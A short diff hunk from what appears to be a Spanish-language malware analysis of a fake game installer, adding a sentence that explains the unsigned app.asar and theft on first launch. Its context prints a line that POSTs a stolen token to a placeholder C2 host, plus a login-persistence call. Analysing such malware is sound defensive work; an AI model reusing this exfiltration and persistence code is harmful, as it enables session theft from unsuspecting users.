@@ -48,7 +48,7 @@ fetch('https://<c2>/collect', {method:'POST', body: JSON.stringify({token:t})});
 app.setLoginItemSettings({openAtLogin:true});
 ```
 
-El acceso a `leveldb` + POST a un dominio desconocido + persistencia en login describe el robo de sesión.
+El acceso a `leveldb` + POST a un dominio desconocido + persistencia en login describe el robo de sesión. La clave del caso: el instalador es un juego **falso**, `app.asar` está sin firmar y el robo ocurre en el primer arranque, no tras una acción del usuario.
 
 ## Lecciones
 
